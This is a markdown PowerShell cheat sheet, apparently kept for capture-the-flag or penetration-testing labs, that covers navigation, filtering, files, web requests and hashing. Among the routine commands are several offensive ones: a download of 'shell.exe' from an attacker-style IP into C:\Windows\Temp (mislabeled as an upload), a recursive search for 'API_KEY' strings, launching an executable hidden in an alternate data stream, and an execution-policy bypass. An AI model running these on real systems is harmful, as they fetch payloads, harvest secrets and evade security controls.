## General

- Change Directory:
`Set-Location -Path c:\users\administrator\desktop`

- Get Working Directory
`Get-Location`

## Network

- Get IP info
	```Powershell
		Get-NetIPAddress
	```

## Commands - info and filters

- Find command:
`Get-Command Verb-*`

- Get Command methods
`Get-Command | Get-Member -MemberType Method`

- Count number of cmdlets
`Get-ChildItem -Recurse | Where {$_.Name -match 'Replace'} | Select Fullname`

## Object manipulation

- Operators
`-operator` is a list of the following operators:
	-   -Contains: if any item in the property value is an exact match for the specified value
	-   -EQ: if the property value is the same as the specified value
	-   -GT: if the property value is greater than the specified value
	-  [Link to all operators](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object?view=powershell-7.2&viewFallbackFrom=powershell-6)

- Filter objects
`Verb-Noun | Where-Object -Property PropertyName -operator Value`
`Verb-Noun | Where-Object {$_.PropertyName -operator Value}`

- Sort objects:
`Verb-Noun | Sort-Object`

- View in GUI format
	```powershell
	Get-Process | Out-Gridview
	```

## Files 
- List files:
`Get-ChildItem`
`Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue`

- Find files by extension:
	`Select-String -Path 'c:\users\administrator\desktop' -Pattern '*.pdf'`

- Find file by name:
	`Get-ChildItem -Recurse | Where {$_.Name -match 'Replace'} | Select Fullname`

	```Powershell
	Get-ChildItem -path C:\ -r -Include "*.back*"
	```

- Find files containing a string
	```Powershell
	Get-ChildItem -path C:\Users -Recurse | Select-String "API_KEY" -List
	```

- Read content:
`Get-Content`
`Get-Content -Path file.txt | Measure-Object -Word`

- Read content:
`type <filename>`

- Get more information for dir command
	```Powershell
	dir | Format-List *
	```

## Import/Export
- Export command output
	```Powershell
	Get-Process | Export-CSV output.csv
	```
	```Powershell
	Get-Process | Out-File processes.txt
	```


## Web
[Invoke Request docs with examples](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2)

- Make request to web server
`$Response = Invoke-WebRequest -URI https://www.bing.com/search?q=how+many+feet+in+a+mile`

- Get links from a webpage
`(Invoke-WebRequest -Uri "https://aka.ms/pscore6-docs").Links.Href`

- Upload a file:
	```
	powershell -c "Invoke-WebRequest -Uri 'http://10.14.23.1:8080/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'"
	```


## Encoding and hashing
- Hash file:
`Get-FileHash -Algorithm MD5 file.txt`

- Decode base64 contents of file and output to output.bin
	```
	$file = ".\input.txt"; [System.Convert]::FromBase64String((Get-Content $file)) | Set-Content output.bin -Encoding Byte
	```

## Other

- View ADS (Alternate Data Streams):
`Get-Item -Path file.exe -Stream *`

- Launch the hidden executable hiding within ADS:
`wmic process call create $(Resolve-Path file.exe:streamname)`

- Execution Bypass for scope of current session
	```powershell
	Set-ExecutionPolicy Bypass - scope Process
	```

